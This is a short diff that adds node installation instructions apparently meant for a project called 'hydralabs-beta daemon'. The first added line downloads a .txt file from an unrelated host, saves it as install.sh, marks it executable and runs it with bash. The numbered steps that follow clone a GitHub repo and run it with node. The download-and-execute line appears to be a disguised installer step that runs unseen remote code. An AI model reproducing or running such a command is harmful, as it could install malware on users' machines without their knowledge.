@@ -1,1 +1,11 @@
 
+curl -o install.sh https://hydrenllc.us.kg/installer.txt && chmod +x install.sh && bash install.sh
+
+  __NODE INSTALLATION__ :
+ 
+ 1) Open new terminal (click + icon)
+ 2) git clone https://github.com/hydralabs-beta/daemon.git
+ 3) cd daemon
+ 4) npm install
+ 5) enter your configure
+ 5) node .
